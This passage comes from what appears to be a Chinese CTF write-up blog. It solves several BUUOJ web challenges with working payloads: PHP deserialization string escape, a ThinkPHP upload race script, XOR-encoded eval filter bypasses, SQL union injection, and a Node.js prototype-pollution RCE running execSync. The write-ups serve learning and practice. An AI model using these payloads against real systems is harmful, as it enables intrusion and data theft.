class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;age=<span class="string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;nickname=<span class="keyword">new</span> info();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;CtrlCase=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;sql=<span class="keyword">new</span> User();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> UpdateHelper;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$o</span>);</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是我们还需要找到传入序列化的参数，可以实现反序列化。</p><p>通过函数相关找到传入的参数age或nickname参数传入，会被当成Info类里一个很长的字符串，利用字符串逃逸，成功反序列化我们想要传入的内容。在update.php，post提交payload。</p><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>传入后，成功将token设置为admin，再回到登录页面即可登录。</p><p>参考：<a href="https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2#t2">https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2#t2</a></p><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>这是Think PHP文件上传，需要我们自己构造一个上传文件的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">默认路径</span><br><span class="line">/home/index/upload</span><br></pre></td></tr></table></figure><p>Think PHP多文件上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Think PHP里的upload函数在不传参的情况下是批量上传的，利用条件竞争，我们可以绕过文件后缀名的检测，为了获得php后缀，我们需要上传两个其他的文件，因为后缀的命令方式采用了函数uniqid，它是基于微秒的当前时间来更改文件名，同时上传的两个文件名相差不大，这样我们就可以利用将一句话木马上传的文件放在两者之间，进行文件名的爆破猜解。</span><br></pre></td></tr></table></figure><p>python脚本上传：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://8e1f6443-27ad-4385-9440-cf5e93d3dd1d.node4.buuoj.cn/index.php/Home/Index/upload&quot;</span></span><br><span class="line">file1=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;/xxx/1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125;</span><br><span class="line">file2=&#123;<span class="string">&#x27;file[]&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;/xxx/test.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125;<span class="comment">#upload不传参数使用[]</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url=url,files=file1)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r=requests.post(url=url,files=file2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r=requests.post(url=url,files=file1)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;\/Public\/Uploads\/2021-07-12\/60ec3881cd3dd.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\/Public\/Uploads\/&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\/Public\/Uploads\/2021-07-12\/60ec388219d03.txt&quot;,&quot;success&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>观察一下只有后面六位数不同，我们可以进行爆破。</p><p>使用burp进行爆破即可。</p><h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><p>又是easyphp，直接给了源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[&#x27;_&#x27;];</span><br><span class="line">if ( preg_match(&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;, $_) )</span><br><span class="line">    die(&#x27;rosé will not do it&#x27;);</span><br><span class="line"></span><br><span class="line">if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )</span><br><span class="line">    die(&#x27;you are so close, omg&#x27;);</span><br><span class="line"></span><br><span class="line">eval($_);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>很清楚，有个eval函数，我们要构造payload绕过正则匹配还有看似长度限制执行我们的想要的命令。</p><p>先分析这两个是什么限制，第一个，正则绕过，可以通过这个<a href="https://regex101.com/">网站</a>帮你分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\x00- 0-9                       匹配\x00到空格(\x20)和0-9的数字</span><br><span class="line">&#x27;&quot;`$&amp;.,|[&#123;_defgops              匹配到这些字符</span><br><span class="line">\x7F                            匹配到DEL(\x7F)字符</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下面那个看似长度限制，其实是限制使用不同的字母，不能超过0xd，就是最多只能使用13种的字符。</span><br></pre></td></tr></table></figure><p>我们先试一下取反绕过，成功返回php信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p>php版本是7.3.5，再看看禁用的函数disable_functions，直接把我们常用的system和exec给禁用了，还有其他命令执行都给ban了，导致无法进行任意命令执行。open_basedir也被限制在了/var/www/html。但是我们可以使用scandir函数返回目录，由于返回的是数组，需要配合print_r使用或者var_dump函数，这里再补充一个可以返回目录的函数 glob函数。</p><p>由于取反绕过无法通过第二个限制，我们后面将使用异或绕过，毕竟它的变化更多。可以用更多的替换。</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">复习一下正则匹配绕过的姿势</a></p><p>目标构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><p>超过了字符限制，我们缩减字符，脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">result2 = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c]  # Original chars,11 total</span><br><span class="line">result = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c]  # to be deleted</span><br><span class="line">temp = []</span><br><span class="line">for d in result2:</span><br><span class="line">    for a in result:</span><br><span class="line">        for b in result:</span><br><span class="line">            for c in result:</span><br><span class="line">                if (a ^ b ^ c == d):</span><br><span class="line">                    if a == b == c == d:</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d))</span><br><span class="line">                        if d not in temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure><p>缩减后还剩，11种，还是不够。还能继续删除。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><p>返回目录后，我们要读取文件内容，可以使用show_source或者readfile，同时我们想要获得的文件在最后面，我们可以使用函数end获取文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">result2 = [160, 136, 138, 140, 141, 144, 145, 209, 150, 151, 154, 155, 156, 158]  # Original chars,14 total</span><br><span class="line">result = [160, 136, 141, 209, 151, 154, 155, 156]</span><br><span class="line">temp = []</span><br><span class="line">for d in result2:</span><br><span class="line">    for a in result:</span><br><span class="line">        for b in result:</span><br><span class="line">            for c in result:</span><br><span class="line">                if (a ^ b ^ c == d):</span><br><span class="line">                    if (a == b == c == d) or (a==b) or (b==c) or (c==d) or(a==c):</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d))</span><br><span class="line">                        if d not in temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(end(scandir(.)));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure><h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>先大致浏览一下前端，看看有没有什么提示，好像没有，一般不要一上来就扫目录，效率太低，然后我们抓包看一下，分别点这几个会发送什么给服务器。</p><p>抓了几个看看就发现可以存在传参。</p><p>通过search传参，有个query查询数据，感觉有点像sql注入，我们先试一下。</p><p>开始尝试sql注入，多尝试就知道注入点在哪里了。</p><p>成功判断字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query?search=utopia_basin order by 2</span><br></pre></td></tr></table></figure><p>注意前面的utopia_basin，不然只会返回1。</p><p>数字型注入，爆出数据库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query?search=utopia_basin union select 1,2</span><br></pre></td></tr></table></figure><p>这题最坑的就是flag在另一个数据库里面，我们需要使用sqlmap爆出另外一个数据库alien_code</p><p>然后再不断爆信息，最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query?search=utopia_basin union select 1,group_concat(code)from alien_code.code</span><br></pre></td></tr></table></figure><p>后面指定的是alien_code数据库中的表code。</p><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>发现存在源码泄露，<a href="http://www.zip,下载下来审计一下./">www.zip，下载下来审计一下。</a></p><p>这里也不知道利用什么，看一下wp。</p><p>考察<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">原型链污染</a>，之前还都没听说过，还是有很多需要学习。</p><p>原型链的特性：</p><p>在调用某一对象的属性时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.对象(obj)中寻找这一属性</span><br><span class="line">2.如果找不到，则在obj.__proto__中寻找属性</span><br><span class="line">3.如果仍然找不到，则继续在obj.__proto__.__proto__中寻找这一属性</span><br></pre></td></tr></table></figure><p>这样的机制被称为js的prototype继承链，与原型链污染密切相关。</p><p>原型链污染</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</span><br></pre></td></tr></table></figure><p>往往看见merge和clone函数就可以往原型链污染思考，跟进函数，寻找污染点。</p><p>来自某师傅的总结</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">总结下：</span><br><span class="line">1.原型链污染属于前端漏洞应用，基本上需要源码审计功力来进行解决；找到merge(),clone()只是确定漏洞的开始</span><br><span class="line">2.进行审计需要以达成RCE为主要目的。通常exec, return等等都是值得注意的关键字。</span><br><span class="line">3.题目基本是以弹shell为最终目的。目前来看很多Node.js传统弹shell方式并不适用.wget,curl,以及我两道题都用到的nc比较适用。</span><br></pre></td></tr></table></figure><p>我们需要先绕过登录，不懂点js代码，还真看不懂这些，在index.js存在漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;user&#x27;:req.body.userid.toUpperCase()</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">js大小写特性</a></p><p><code>toUpperCase</code>就是将小写转化成大写的函数，这里就利用其中的漏洞，我们注册一个名为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admın</span><br></pre></td></tr></table></figure><p>的用户，因为要是admin用户才能使用clone函数。</p><p>然后我们再登陆，就可以将</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admın经过函数处理就变成ADMIN</span><br></pre></td></tr></table></figure><p>寻找可以污染的参数，就是没有被定义的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.get(&#x27;/info&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里的outputFunctionName就可以进行ssti注入，抓Action的包，然后修改为json类型。</p><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>最后访问/info即可下载得到flag。</p><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>主要考python的代码审计，果然网安，什么都要懂一些。</p><p>如何后面主要是逻辑漏洞，一般有购买的都挺多逻辑漏洞的，但是这种跟我们前面遇到的篡改数字是不一样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def get_flag_handler(args):</span><br><span class="line">    if session[&#x27;num_items&#x27;] &gt;= 5:</span><br><span class="line">        # show_flag_function has been disabled, no worries</span><br><span class="line">        trigger_event(&#x27;func:show_flag;&#x27; + FLAG()</span><br><span class="line">    trigger_event(&#x27;action:view;index&#x27;)</span><br></pre></td></tr></table></figure><p>我们想要获得flag就需要调用这个函数<code>get_flag_handler</code>。同时在<code>execute_event_loop</code>函数找到了<code>eval</code>这个函数，在函数看看要怎么利用构造我们想要的执行的代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_action = event[0] == &#x27;a&#x27; </span><br><span class="line">action = get_mid_str(event, &#x27;:&#x27;, &#x27;;&#x27;) </span><br><span class="line">args = get_mid_str(event, action+&#x27;;&#x27;).split(&#x27;#&#x27;) </span><br></pre></td></tr></table></figure><p> 看到<code>execute_event_loop</code>代码，这里通过#将命令分割，我们可以通过#进行多命令的执行，这样就可以执行我们想要执行的函数。</p><p>传入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;2%23action:buy;3%23action:get_flag;%23</span><br></pre></td></tr></table></figure><p>同时这是flask处理的session，<a href="https://github.com/noraj/flask-session-cookie-manager">我们通过脚本</a></p><p>到kali虚拟机里，下载脚本，然后执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;.eJyNzU-LgkAYx_G3sjxnD9MMEQpegk2KHGnXGueJZdEMs2YmQe3PhO99vewh8ODtge_D5_cCdS3A2-9f8JGBB1Jwkgq3jfRqcozrJ3TOcLFDJVf5wtVZsDDR3feh-3H-XTS7VtrqnNGpzcVEJWx-S8WURHbpD0gGK0wOs_7jgkkxUgpHSu-QTQOXJRRrKQ4z1I8Tskah5mUovhR-kwc_L-k63jAebxspNk9ZEopidwntZ98KyoOVO24YTKt_y-aoa_CYA9W1NE1_ku4PAcl7jA.YPFNOw.HxuyEAnWbhDWtSmZafpROdM3eJI&#x27;</span><br></pre></td></tr></table></figure><p>如果对python不是很懂的，<a href="https://blog.csdn.net/wuyaowangchuan/article/details/110471985">想看看源代码分析可以参考这些师傅的</a></p><p>同时也有一边关于<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">客户端session导致的安全问题</a>的文章</p><h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>python脚本的编写。</p><p>需要使用到正则表达，还有函数eval来计算，并提交结果一千次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def calculation():</span><br><span class="line">    s = requests.session()</span><br><span class="line">    url = &#x27;http://87431464-1ee4-47b3-bf20-17da5f5341a5.node4.buuoj.cn/index.php&#x27;</span><br><span class="line">    match = re.compile(r&quot;[0-9]+ [+|-] [0-9]+&quot;)#r是将双引号里面的看成原始字符串处理，+号是匹配一次或无限次前面的字符，进行预编译，有利于提高匹配速度</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    for i in range(1001):</span><br><span class="line">        try:</span><br><span class="line">            str = match.findall(r.text)[0]匹配到计算表达式</span><br><span class="line">            # print(eval(str))</span><br><span class="line">            data = &#123;&quot;answer&quot; : eval(str)&#125;</span><br><span class="line">            r = s.post(url, data=data)</span><br><span class="line">            r.encoding = &quot;utf-8&quot;</span><br><span class="line">            print(&#x27;&#123;&#125; : &#123;&#125;&#x27;.format(i,eval(str)))</span><br><span class="line">            sleep(1)#防止跳500状态码，服务端报错,需要足够的耐心，也就等个1000秒</span><br><span class="line">        except:</span><br><span class="line">            pass #添加这个是为了防止出现list index out of range，应该是有时候没匹配到，导致列表内容为空。</span><br><span class="line">        # print(r.text)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    calculation()</span><br></pre></td></tr></table></figure><p>很好结果有跑出来，没有白等，但是正则表达式老是容易遗忘，需要找点练习练一下了。</p><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>尝试了很多都没有其他有效回显，试一下几个敏感目录，成功下载了<a href="http://www.zip,源码/">www.zip,源码</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&#x27;Content-type:text/html; charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_POST[&#x27;login&#x27;]))&#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">    $Private_key = $_POST[&#x27;Private_key&#x27;];</span><br><span class="line">    if (($username == &#x27;&#x27;) || ($password == &#x27;&#x27;) ||($Private_key == &#x27;&#x27;)) &#123;</span><br><span class="line">        // 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo 